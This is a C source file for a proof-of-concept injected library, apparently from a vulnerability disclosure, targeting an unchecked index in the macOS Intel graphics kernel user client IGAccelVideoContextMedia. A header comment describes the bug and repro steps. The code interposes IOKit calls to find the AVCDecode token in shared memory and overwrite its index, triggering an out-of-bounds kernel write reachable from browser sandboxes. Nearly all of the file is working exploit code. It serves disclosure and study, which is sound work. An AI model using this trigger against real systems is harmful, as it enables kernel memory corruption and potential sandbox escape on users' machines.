/*
easy repro with:
DYLD_INSERT_LIBRARIES=<path/to/this/lib.dylib> /Applications/QuickTime\ Player.app/Contents/MacOS/QuickTime\ Player
and play an mp4 file

BUG:

the dword at offset 0x814 of the AVCDecode token used by the IGAccelVideoContextMedia user client is used to compute an index
for a memory write without performing any bounds checking, allowing a controlled out-of-bounds write to kernel memory.

The value is read in IGAccelVideoContextMedia::process_token_AVCDecode and gets passed as an argument to patch_AVC_WA.

IMPACT:
This userclient can be instantiated in the chrome GPU process sandbox and the safari renderer sandbox.

tested on: MacBookAir5,2 w/ 10.9.3/13d64
*/


#include <inttypes.h>
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


void* token_buf = 0;

kern_return_t
fake_IOConnectMapMemory(
  io_connect_t connect,
  uint32_t memoryType,
  task_port_t intoTask,
  vm_address_t *atAddress,
  vm_size_t *ofSize,
  IOOptionBits options )
{
  kern_return_t ret = IOConnectMapMemory(connect, memoryType, intoTask, atAddress, ofSize, options);
  
  if (memoryType == 0){
    token_buf = *atAddress;
  }
  return ret;
}

kern_return_t
fake_IOConnectCallStructMethod(
        mach_port_t      connection,            // In
        uint32_t         selector,              // In
        const void      *inputStruct,           // In
        size_t           inputStructCnt,        // In
        void            *outputStruct,          // Out
        size_t          *outputStructCnt)       // In/Out
{ 
  if (selector == 2){
    if (token_buf != 0){
      uint16_t needle = 0x8d00; // AVCDecode token
      
      uint32_t* at = memmem(token_buf, 0x1000, &needle, 2);
      if (at){
        at[0x814/4] = 0x12345678; //uncheck index
      }
      
    }
  }

  return IOConnectCallStructMethod(
          connection,            // In
          selector,              // In
          inputStruct,           // In
          inputStructCnt,        // In
          outputStruct,          // Out
          outputStructCnt);      // In/Out

}

typedef struct interposer {
  void* replacement;
  void* original;
} interpose_t;

__attribute__((used)) static const interpose_t interposers[]
  __attribute__((section("__DATA, __interpose"))) =
    { {.replacement = (void*)fake_IOConnectMapMemory, .original = (void*)IOConnectMapMemory},
      {.replacement = (void*)fake_IOConnectCallStructMethod, .original = (void*)IOConnectCallStructMethod},
    };

